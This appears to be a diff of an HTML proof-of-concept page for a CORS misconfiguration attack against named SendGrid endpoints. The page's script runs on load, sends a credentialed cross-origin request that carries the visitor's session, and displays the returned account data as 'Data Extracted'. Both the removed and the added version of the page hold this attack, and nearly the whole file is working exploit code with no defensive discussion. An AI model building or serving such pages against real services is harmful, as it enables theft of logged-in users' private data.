@@ -1,39 +1,49 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS Exploit PoC</title>
+    <meta charset="UTF-8">
+    <title>CORS Exploitation PoC</title>
 </head>
-<body style="font-family: sans-serif; background: #0d1117; color: #58a6ff; padding: 50px; text-align: center;">
-    <h1 style="color: #ff7b72;">CORS Bypass PoC</h1>
-    <p style="color: #c9d1d9;">Target: <code>api.sendgrid.com</code></p>
-    <hr style="border: 1px solid #30363d; width: 50%;">
+<body>
+    <h1>CORS Vulnerability - Proof of Concept</h1>
+    <p>Targeting: <code id="target-url">https://mc.sendgrid.com/automations?view=raw</code></p>
     
-    <div id="status" style="margin: 20px; font-weight: bold; font-size: 1.2em;">Status: Initiating Attack...</div>
-    
-    <pre id="output" style="background: #161b22; color: #7ee787; padding: 20px; border: 1px solid #30363d; border-radius: 6px; text-align: left; display: inline-block; min-width: 300px; max-width: 90%; overflow-x: auto;">
-        Waiting for SendGrid response...
-    </pre>
+    <div id="result" style="background: #f4f4f4; padding: 15px; border: 1px solid #ccc;">
+        Waiting for response...
+    </div>
 
     <script>
-        const target = "https://api.sendgrid.com/v3/offerings?_show&_all";
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", target, true);
-        xhr.withCredentials = true;
+        const target = "https://mc.sendgrid.com/automations?view=raw";
+        document.getElementById('target-url').innerText = target;
 
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState == 4) {
-                if (xhr.status == 200) {
-                    document.getElementById("status").innerText = "SUCCESS: Data Leaked!";
-                    document.getElementById("status").style.color = "#3fb950";
-                    document.getElementById("output").innerText = JSON.stringify(JSON.parse(xhr.responseText), null, 4);
-                } else {
-                    document.getElementById("status").innerText = "FAILED: Status " + xhr.status;
-                    document.getElementById("status").style.color = "#f85149";
-                    document.getElementById("output").innerText = "CORS Blocked. Check F12 Network for Origin Reflection.";
+        function exploit() {
+            var xhr = new XMLHttpRequest();
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE) {
+                    if (xhr.status == 200) {
+                        document.getElementById('result').innerHTML = 
+                            "<h3>Success! Data Extracted:</h3><pre>" + 
+                            escapeHtml(xhr.responseText) + "</pre>";
+                    } else {
+                        document.getElementById('result').innerHTML = 
+                            "<h3 style='color:red;'>Failed! Status: " + xhr.status + "</h3>";
+                    }
                 }
-            }
-        };
-        xhr.send();
+            };
+
+            xhr.open("GET", target, true);
+            xhr.withCredentials = true; 
+            xhr.send();
+        }
+
+        function escapeHtml(text) {
+            var div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        window.onload = exploit;
     </script>
 </body>
 </html>
